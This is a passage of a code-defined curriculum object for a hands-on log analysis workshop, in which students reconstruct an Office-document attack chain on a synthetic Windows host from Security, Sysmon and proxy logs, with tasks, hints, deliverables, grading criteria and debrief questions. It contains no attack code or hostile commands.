          { item: 'The HR-WS-08 log pack (downloadable from this page)', note: 'Merged Windows Security, Sysmon and proxy events for a four-hour window. Roughly 400 lines.', file: '00-hr-ws-08-logs.md' },
          { item: 'The timeline template (downloadable)', note: 'Columns: time, source, event, what it proves, ATT&CK ID, confidence.', file: '01-timeline-template.md' },
          { item: 'CyberChef', note: 'Browser-based. Needed for the base64 decode steps. No installation.' },
          { item: 'A text editor with search', note: 'You will be filtering by hand. Any editor with find-in-file is sufficient.' },
        ],
        setup: [
          'Download the log pack and the timeline template.',
          'Create a working folder named hr-ws-08-<your-name>.',
          'Open CyberChef in a second tab.',
          'Before filtering anything, read fifty consecutive lines from the middle of the pack to calibrate what ordinary activity on this host looks like. You cannot recognise abnormal without that.',
        ],
        realism:
          'The log pack is synthetic, generated for this workshop. Field names and Event IDs follow the real Windows Security and Sysmon schemas so the skills transfer directly, but no real host produced these events and no address in the pack should be visited. There is no SIEM here — you are filtering by hand deliberately, because doing it once by hand is what makes a SIEM query comprehensible afterwards.',
        provenance: 'source',
        sources: [{ file: FILE, section: '9. Tools / Workflow — Log Analysis Investigation Workflow' }],
      },

      {
        kind: 'tasks',
        id: 'tasks',
        title: 'Your tasks',
        minutes: 55,
        lead: 'Work in the order given. Task 2 depends on the baseline you build in task 1, and skipping it makes the rest slower, not faster.',
        tasks: [
          {
            ref: 'T1',
            minutes: 8,
            title: 'Establish the baseline',
            steps: [
              'Read fifty consecutive lines without searching for anything.',
              'Write down the five most common parent-child process pairs on this host.',
              'Note the normal working hours visible in the authentication events.',
              'Note which user accounts appear and what each appears to do.',
            ],
            produces: 'A short baseline note: common process pairs, working hours, accounts in use.',
          },
          {
            ref: 'T2',
            minutes: 15,
            title: 'Find the entry point',
            steps: [
              'Search for Office applications as a parent process.',
              'When you find a break in the normal pattern, record the exact timestamp.',
              'Work backwards: what happened in the ten minutes before it? Is there a mail or browser event that explains the document?',
              'Record what you can establish about delivery, and what remains unknown.',
            ],
            produces: 'The initial access timestamp with its supporting evidence, and an explicit note on what delivery evidence is missing.',
          },
          {
            ref: 'T3',
            minutes: 17,
            title: 'Follow the chain forward',
            steps: [
              'From the entry point, trace each subsequent process spawned by the chain.',
              'Decode every encoded command in CyberChef and record both the encoded and decoded forms.',
              'Find the network connections attributed to chain processes, and the files they wrote.',
              'Find the persistence mechanism. There is at least one.',
              'Record each step in the timeline template with its evidence source.',
            ],
            produces: 'A completed timeline from initial access to persistence, one row per confirmed step.',
          },
          {
            ref: 'T4',
            minutes: 15,
            title: 'Map, classify and state your uncertainty',
            steps: [
              'Map every confirmed step to an ATT&CK technique, with the identifier.',
              'Label each timeline row: observation, hypothesis, or confirmed. For this workshop, reserve the confirmed label for findings with two supporting sources; state when they share a collector or trust boundary.',
              'Write down three things you cannot determine from logs alone.',
              'For each, name the specific evidence source that would resolve it — memory image, disk image, EDR telemetry, full packet capture.',
            ],
            produces: 'A mapped and classified timeline, plus a list of three open questions with the evidence each would need.',
          },
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '9. Tools / Workflow — Log Analysis Investigation Workflow' }],
      },

      {
        kind: 'hints',
        id: 'hints',
        title: 'Progressive hints',
        lead: 'One tier at a time.',
        hints: [
          {
            forTask: 'T1',
            tiers: [
              'You are looking for what is boring. The five pairs you see most often are your baseline.',
              'explorer.exe as a parent means a user clicked something. services.exe as a parent means Windows started something. Those two cover most ordinary activity.',
              'If a parent-child pair appears fewer than three times in four hours, it is worth a second look later.',
            ],
          },
          {
            forTask: 'T2',
            tiers: [
              'Filter on ParentImage containing WINWORD, EXCEL or OUTLOOK and read every result.',
              'The entry point is the first line where an Office application spawns something that is not an Office application.',
              'For delivery: check whether the pack contains mail gateway events at all. If it does not, that absence is your answer to the "what is missing" part, and it is a correct answer.',
            ],
          },
          {
            forTask: 'T3',
            tiers: [
              'Chain processes by process ID where the pack gives them, and by time proximity where it does not.',
              'After the download, look for a Sysmon Event ID 11 — a file creation. Then look for anything referencing that file path afterwards.',
              'Persistence is Event ID 4698 (scheduled task), 7045 (new service), or a Sysmon Event ID 13 writing a registry Run key. Check all three; the pack contains more than one.',
            ],
          },
          {
            forTask: 'T4',
            tiers: [
              'For a confirmed interpretation, name the supporting evidence. Distinguish a directly observed event from your explanation of it, and state if both records depend on the same collector.',
              'Good open questions are about what logs structurally cannot record: process memory contents, whether a credential was actually used, what was inside the encrypted payload.',
              'If you are stuck, consider the privilege grant. The log shows privileges assigned. What evidence source would show whether they were exercised?',
            ],
          },
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'deliverables',
        id: 'deliverables',
        title: 'Organise your evidence and submit',
        minutes: 15,
        lead: 'Same structure as Session 1, extended for timeline work. Build it as you go rather than at the end.',
        items: [
          { ref: 'D1', text: 'Baseline note — common process pairs, working hours, accounts', required: true },
          { ref: 'D2', text: 'Completed timeline — every step with timestamp, evidence source, ATT&CK ID and confidence label', required: true },
          { ref: 'D3', text: 'Decoded commands — both the encoded and decoded form of each', required: true },
          { ref: 'D4', text: 'Three open questions, each with the evidence source that would resolve it', required: true },
          { ref: 'D5', text: 'A short finding in the Finding / Severity / Impact / Evidence / Remediation format', required: true },
          { ref: 'D6', text: 'A detection query that would have caught the entry point, with its limitations stated', required: false },
        ],
        structure: `hr-ws-08-<your-name>/
  00-baseline.md          → T1: what normal looks like on this host
  01-timeline.md          → T2+T3: the reconstructed chain
  02-decoded.md           → T3: encoded and decoded command pairs
  03-open-questions.md    → T4: what logs cannot tell you, and what would
  04-finding.md           → Finding / Severity / Impact / Evidence / Remediation
  05-detection.md         → optional: the rule, and what it would miss`,
        provenance: 'source',
        sources: [
          { file: FILE, section: '6. Reporting Mindset' },
          { file: FILE, section: '9. Tools / Workflow — Detection Query Folder Structure' },
        ],
      },

      {
        kind: 'assessment',
        id: 'assessment',
        title: 'How this is assessed',
        criteria: [
          {
            band: 'Timeline completeness',
            weight: '30%',
            descriptor:
              'Every stage from initial access to persistence is present, in order, with an accurate timestamp and a named evidence source for each.',
          },
          {
            band: 'Evidence discipline',
            weight: '25%',
            descriptor:
              'Observations, hypotheses and confirmed findings are labelled distinctly. Confirmed interpretations have supporting evidence and state any shared-source limits. The report claims no more than the evidence supports.',
          },
          {
            band: 'Signal separation',
            weight: '20%',
            descriptor:
              'Legitimate activity is excluded from the chain and attack steps are not missed. Both over-inclusion and omission cost marks.',
          },
          {
            band: 'Stated uncertainty',
            weight: '15%',
            descriptor:
              'Three genuine limits of log evidence are identified, each paired with the specific evidence source that would resolve it. Vague uncertainty scores nothing.',
          },
          {
            band: 'ATT&CK mapping',
            weight: '10%',
            descriptor: 'Techniques are correctly identified by ID, and the mapping is consistent with what the evidence shows.',
          },
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'debrief',
        id: 'debrief',
        title: 'Debrief',
        minutes: 10,
        questions: [
          'Who found the entry point first, and what did they search for? Compare search strategies — the difference is usually baseline-first versus keyword-first.',
          'Did anyone include a legitimate line in their chain? Which one, and what made it look like it belonged?',
          'How many persistence mechanisms did the room find? Did everyone find the same number?',
          'What did you label confirmed, and could you genuinely name two independent sources for it?',
          'What was the most useful single log source in the pack, and which one would you have traded three others for?',
          'If this host had no Sysmon, how much of your timeline survives?',
        ],
        landingPoint:
          'Logs do not contain the story. They contain the fragments, in arrival order, surrounded by ordinary activity — and reconstruction is an act of disciplined inference, which is why labelling what you have actually confirmed is not pedantry but the core of the method.',
        provenance: 'supplementary',
      },

      {
        kind: 'recap',
        id: 'recap',
        title: 'Recap and further study',
        provenance: 'source',
        sources: [{ file: FILE, section: '13. Summary' }],
        takeaways: [
          'Logs are the raw evidence. Without them there is no investigation, no report and no legal position.',
          'Windows Security Event IDs 4624, 4625, 4648, 4672, 4698 and 4720 carry the backbone of Windows detection.',
          'Default Windows logging is insufficient and must be hardened by policy before an incident.',
          'Sysmon Event IDs 1, 3, 8, 11 and 22 turn isolated events into reconstructable chains.',
          'LOLBin detection is argument detection. The binary is always legitimate.',
          'False positive assessment has five parts: context, timing, frequency, corroboration and baseline.',
        ],
        furtherStudy: [
          { label: 'Microsoft — Advanced security audit policy settings', note: 'How to actually enable 4688 with command line and Script Block Logging via Group Policy.', href: 'https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-auditing' },
          { label: 'SwiftOnSecurity Sysmon configuration', note: 'A widely used, well-commented community Sysmon baseline. Read the comments — they explain the reasoning.', href: 'https://github.com/SwiftOnSecurity/sysmon-config' },
          { label: 'Next: Session 3 — Phishing Investigation', note: 'You reconstructed what happened after the document was opened. Next: where the document came from, and who else received it.' },
        ],
      },
    ],
  },

  terms: [
    { term: 'Event ID', definition: 'A number identifying the type of a Windows event. 4624 is a successful logon; 4698 is a scheduled task creation.' },
    { term: 'LogonType', definition: 'A field on Windows logon events describing how the logon occurred. 2 console, 3 network, 5 service, 10 RDP.' },
    { term: 'Sysmon', definition: 'A free Microsoft Sysinternals tool that extends Windows logging with process, network, file and registry detail.' },
    { term: 'LOLBin', definition: 'Living off the Land Binary — a legitimate signed system executable used for malicious purposes. Detected by argument, not name.' },
    { term: 'Script Block Logging', definition: 'A PowerShell setting that records every script block executed, including the decoded form of obfuscated commands.' },
    { term: 'Beaconing', definition: 'Regular, timed outbound connections from an implant to its command-and-control server. Covered fully in Session 7.' },
    { term: 'auditd', definition: 'The Linux kernel auditing subsystem. Records command execution and file access independently of shell history.' },
  ],
}
